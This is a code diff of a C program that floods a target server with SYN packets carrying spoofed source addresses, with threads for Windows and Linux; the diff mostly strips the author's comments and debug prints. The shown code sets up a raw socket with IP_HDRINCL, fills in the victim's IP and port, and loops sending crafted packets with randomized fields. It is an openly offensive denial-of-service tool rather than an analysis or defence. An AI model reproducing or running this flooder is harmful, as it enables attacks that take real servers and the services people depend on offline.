@@ -1,34 +1,12 @@
-/* 
- * made by ZED
- * this program will spam SYN packets that have a false source address
- * which will leave the server in many many "half open" states
- *
- * also certain flags have been set in the tcp header to make the packets more unique
- * this includes random id, and sequence number
- * i also made the option to have tcp flags changing at different intervals
- *
- * - Headers
- * the ip and tcp header is neccessary for building the datagram from scratch with our own details
- * in header.h i made the structs for the ip & tcp header instead of including netinet libraries so it can be compiled on windows
- * 
- * - Numbers
- * i implemented some weird as shit mathy random number generator from wikipedia
- * it works so so so much faster than normal rand()
- * 
- * - Threads & Platform compatibility
- * i made sure to be careful with threads considering the usage of dynamic memory in tcp_checksum()
- * using normal windows API threads for windows and pthread for linux
- */
-
 #ifdef _WIN32
-    #include <Windows.h> // windows API functions
-    #include <WinSock2.h> // windows sockets
-    #include <WS2tcpip.h> // setsockopt options
+    #include <Windows.h>
+    #include <WinSock2.h>
+    #include <WS2tcpip.h> 
 #else
-    #include <sys/socket.h> // linux sockets
-    #include <arpa/inet.h> // socket / header options
-    #include <unistd.h> // unix std library
-    #include <pthread.h> // linux threads
+    #include <sys/socket.h>
+    #include <arpa/inet.h>
+    #include <unistd.h>
+    #include <pthread.h>
 #endif
 
 #include <stdio.h>
@@ -57,7 +35,7 @@ uint8_t FLOODING = 1;
     void *syn_flood()
 #endif
 {
-    char datagram[MAX_PACKET_LENGTH]; // datagram = header and payload
+    char datagram[MAX_PACKET_LENGTH];
     struct iphdr *iph = (struct iphdr *)datagram; 
     struct tcphdr *tcph = (void*)iph + sizeof(struct iphdr); //! (void*)
 
@@ -76,25 +54,21 @@ uint8_t FLOODING = 1;
     #endif
 
     // creating raw socket // btw uint64_t is unsigned long long which is SOCKET type
-    //printf("Creating Socket\n");
     uint64_t s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if(s < 0){
-            perror("Could not open raw socket: \n");
+            perror("Could not create raw socket, are you running in root? Error: \n");
             exit(-1); // close program
     }
-    //printf("Setting up header fields\n");
     memset(datagram, 0, MAX_PACKET_LENGTH); // wipe datagram
     header_setup(iph, tcph); // fill out ip and tcp header fields
 
     // add the destination fields
-    //printf("Adding victim info to headers & running checksum\n");
     // Target IP and PORT can be changed at the top of file
     tcph->dest = htons(PORT); // set port
     iph->ip_dst = dst.sin_addr.s_addr; // set IP
     iph->check = checksum ((uint16_t *)datagram, iph->tot_len);
     
     // set socket option to use the headers that were just set up
-    //printf("Setting sock options to include headers\n");
     int error_code = 1;
     if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&error_code, sizeof(error_code)) < 0) {
             perror("IP_HDRINCL cannot be set: \n");
@@ -103,13 +77,13 @@ uint8_t FLOODING = 1;
 
     // vars to change the same tcp header flags
     register int i = 0;
-    //if (USE_RANDOM_FLAGS) {
+    //if (USE_RANDOM_FLAGS) { commented this out just for now
     uint16_t psh = 0;
     uint16_t res1 = 0;
     uint16_t res2 = 0;
     //}
     uint32_t rand_num;
-    //printf("Starting Flood\n");
+    
     // after RUN_SECONDS is done FLOODING is set to 0 in the main thread ending the loop
     while(FLOODING)
     {
@@ -144,7 +118,7 @@ uint8_t FLOODING = 1;
     }
     printf("Done! sent %d packets\n", i);
     #ifndef _WIN32
-        __sync_fetch_and_sub(&thread_count,1);
+        __sync_fetch_and_sub(&thread_count,1); // this is kinda nice
     #endif
 }
 
@@ -153,9 +127,7 @@ int main()
     init_rand(time(NULL)); // initialize fast num gen
     srand(time(NULL)); // set seed
     
-    #ifdef _WIN32// || _WIN64
-        //create thread handles
-        //HANDLE thread1_handle, thread2_handle;
+    #ifdef _WIN32
         int i;
         HANDLE array_of_threads[NUM_OF_THREADS];
 
@@ -176,7 +148,7 @@ int main()
             CloseHandle(array_of_threads[i]);
         }
 
-    #else // pthread is a bit iffy
+    #else
         pthread_t thread[NUM_OF_THREADS];
         thread_count = NUM_OF_THREADS;
 
